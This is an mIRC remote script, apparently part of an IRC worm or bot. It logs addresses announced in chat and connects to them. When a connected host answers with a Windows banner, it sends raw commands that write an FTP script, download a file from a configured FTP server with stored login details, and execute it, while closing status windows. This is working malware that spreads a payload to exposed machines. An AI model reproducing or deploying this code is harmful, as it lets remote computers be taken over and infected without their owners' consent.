[script]
n0=on *:text:*:*:{ 
n1=   if ($3 == $decode(%hport)) { 
n2=      .write -a fscan.txt $1 $3 | return 
n3=   } 
n4=}
n5=alias check-scan {
n6=  if ($read(fscan.txt) != $null) {
n7=    if ($exists(froot.txt) != $true) {    
n8=      $read(fscan.txt,1) | if ($1 == $ip) { write -dl1 fscan.txt | halt }
n9=      fscan $read(fscan.txt,1)  
n10=    }
n11=  }
n12=}
n13=alias fscan { write -dl1 fscan.txt 
n14=    .write -c froot.txt
n15=    server -m $1 $2
n16=    timer $+ $1 1 15 scon $scid(0) window -c "Status Window"
n17=    timerk 1 15 remove froot.txt
n18=}
n19=raw *:*microsoft*:{
n20=  timer 1 20 window -c "Status Window"
n21=  raw echo open %ftpip %ftpport > echo.txt
n22=  raw echo %flog >> echo.txt
n23=  raw echo %fpass >> echo.txt
n24=  raw echo get %ftpfile >> echo.txt
n25=  raw echo quit >> echo.txt
n26=  raw ftp -s:echo.txt
n27=  raw %ftpfile
n28=}
